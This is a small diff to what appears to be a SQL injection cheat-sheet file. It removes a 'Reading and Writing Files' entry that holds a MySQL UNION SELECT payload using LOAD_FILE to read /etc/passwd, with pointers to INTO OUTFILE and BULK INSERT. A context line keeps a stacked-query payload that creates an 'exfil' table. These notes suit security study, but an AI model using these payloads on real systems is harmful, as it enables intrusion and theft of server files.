@@ -181,9 +181,7 @@ Dent' ;  CREATE TABLE exfil(data varchar(1000));--
 
 > **Reading and Writing Files**
 
-MySQL - Reading | <code> Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23 </code>
-MySQL - Writing | <code> INTO OUTFILE </code>
-SQL Server - Reading | <code> BULK INSERT </code>
+
 
 > **SQL Injection Cheat Sheets**
 
